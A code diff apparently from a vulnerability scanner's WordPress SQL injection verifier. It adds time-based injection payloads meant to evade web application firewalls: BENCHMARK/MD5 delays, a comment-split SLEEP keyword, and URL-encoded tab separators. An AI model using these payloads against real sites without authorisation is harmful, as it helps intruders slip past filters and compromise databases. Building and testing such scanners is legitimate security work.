@@ -8631,6 +8631,15 @@ def verify_wordpress_sqli(
             # Works in: WHERE col IN ($value) when value is used without quotes.
             (f"{orig_value} AND SLEEP(5)", f"{orig_value} AND SLEEP(0)"),
             (f"{orig_value} AND (SELECT IF(1=1,SLEEP(5),0))", f"{orig_value} AND (SELECT IF(1=2,SLEEP(5),0))"),
+            # WAF bypass: BENCHMARK instead of SLEEP (some WAFs block "SLEEP" keyword)
+            (f"{orig_value}{_rq2} AND BENCHMARK(5000000,MD5(1))-- -",
+             f"{orig_value}{_rq2} AND BENCHMARK(1,MD5(1))-- -"),
+            # WAF bypass: inline comment splits SLEEP keyword
+            (f"{orig_value}{_rq2} AND SL/**/EEP(5)-- -",
+             f"{orig_value}{_rq2} AND SL/**/EEP(0)-- -"),
+            # WAF bypass: hex-encoded space + comment between AND and SLEEP
+            (f"{orig_value}{_rq2}%09AND%09SLEEP(5)-- -",
+             f"{orig_value}{_rq2}%09AND%09SLEEP(0)-- -"),
         ]
         timing_tried = []
         timing_consistent = 0
